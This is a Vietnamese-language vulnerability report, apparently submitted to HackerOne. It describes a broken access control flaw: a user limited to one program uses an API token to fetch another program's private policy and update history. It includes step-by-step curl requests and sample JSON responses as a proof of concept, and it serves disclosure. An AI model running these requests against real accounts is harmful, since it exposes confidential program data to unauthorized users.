# https://hackerone.com/reports/2965723
---

## Môi trường và giả định

* **Tổ chức** đã có **hai chương trình**:

  * `program-A` (chương trình mà user được phân quyền “low”)
  * `program-B` (chương trình không được phân quyền)
* **Người dùng** `low_user` đã được add vào nhóm **low-permission** chỉ cho phép truy cập `program-A`, có quyền rất hạn chế (chỉ “view findings” của A).
* **Bạn** có quyền tạo API token cho `low_user`.

---

## Bước 1: Đăng ký user và phân quyền thấp

1. Trong **Organization Settings** → **People**, add user `low_user@example.com`.
2. Tạo nhóm “LowPermissionA” và gán cho nhóm này quyền **View findings** chỉ trên `program-A`.
3. Kéo `low_user@example.com` vào nhóm “LowPermissionA”.
4. Đảm bảo **không** gán bất kỳ quyền nào liên quan đến `program-B`.

> ![Ảnh minh họa phân quyền thấp cho program-A](F4033454)

---

## Bước 2: Tạo API token cho user

1. Logout admin, login dưới tài khoản `low_user@example.com`.
2. Truy cập **User Settings** → **API Tokens** → **Generate new token**.
3. Ghi lại token, giả sử là `LOW_USER_TOKEN`.

---

## Bước 3: Gửi request truy vấn chương trình không được phép

Dùng `curl` với token vừa tạo để gọi endpoint lấy thông tin policy/program updates của `program-B`:

```bash
curl "https://api.hackerone.com/v1/hackers/programs/program-B/" \
  -X GET \
  -u "LOW_USER_TOKEN:" \
  -H "Accept: application/json"
```

**Kết quả mong đợi (đúng)**:

```json
{
  "error": "Not Found"  // hoặc “Unauthorized” tùy config API
}
```

**Kết quả thực tế (lỗ hổng)**:

```json
{
  "data": {
    "id": "program-B",
    "attributes": {
      "name": "Program B",
      "policy": "Sensitive policy text…",
      "updates": [
        { "date": "2025-01-15", "description": "Chính sách bảo mật…" },
        …
      ]
    }
  }
}
```

> ![Screenshot policy của program B trả về cho user low](F4003567)

---

## Bước 4: Truy vấn lịch sử cập nhật (updates)

Tiếp tục gọi endpoint lịch sử changes:

```bash
curl "https://api.hackerone.com/v1/hackers/programs/program-B/updates" \
  -X GET \
  -u "LOW_USER_TOKEN:" \
  -H "Accept: application/json"
```

**Phản hồi**: danh sách tất cả bản ghi cập nhật (update history) của `program-B`:

```json
{
  "data": [
    { "type": "update", "attributes": { "id": 123, "text": "…", "created_at": "2025-01-20T…" } },
    …
  ]
}
```

> ![Screenshot updates của program B được trả về](F4003571)

---

